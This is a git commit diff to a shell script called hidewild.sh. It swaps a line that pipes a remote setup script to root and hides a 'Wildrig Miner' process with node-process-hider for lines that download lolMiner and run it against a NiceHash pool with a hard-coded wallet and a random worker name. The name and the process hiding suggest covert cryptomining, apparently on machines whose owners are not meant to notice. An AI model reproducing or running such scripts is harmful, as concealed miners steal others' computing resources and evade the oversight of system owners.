a0dc800d234a239d675d9810a32799f301183ad6
baktiarandri43 <106507420+baktiarandri43@users.noreply.github.com>
2022-05-30 12:21:26 +0700

    Update hidewild.sh

--- hidewild.sh
+++ hidewild.sh
@@ -1,1 +1,4 @@
-curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && sudo ph add Wildrig Miner && apt install screen && screen
+sudo apt-get update -y
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
+tar -xf lolMiner_v1.29_Lin64.tar.gz
+cd 1.29 && ./lolMiner --algo ETHASH --pool stratum+tcp://daggerhashimoto.hk.nicehash.com:3353 --user 3QAbQX6ggoZ8MXrQMpuGkr4AFfdpdpfo3G.GPU-Win-$(echo $(shuf -i 1-99 -n 1))--vapers --ethstratum ETHPROXY
